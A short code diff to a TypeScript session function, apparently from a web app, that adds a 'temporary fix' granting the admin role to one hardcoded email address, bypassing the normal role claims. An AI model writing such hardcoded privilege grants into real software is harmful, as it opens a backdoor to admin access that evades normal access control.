@@ -13,7 +13,13 @@ export const getSession = cache(async (): Promise<UserSession | null> => {
     const decodedClaims = await adminAuth.verifySessionCookie(sessionCookie, true);
     
     // Custom claims are used for roles. Default to 'member' if no role is assigned.
-    const userRole = (decodedClaims.role as Role) || 'member';
+    let userRole: Role = (decodedClaims.role as Role) || 'member';
+
+    // Temporary fix: Hardcode admin role for a specific user
+    if (decodedClaims.email === 'anujkumar7676@gmail.com') {
+      userRole = 'admin';
+    }
+
     const role = ROLES.includes(userRole) ? userRole : 'member';
 
     return {
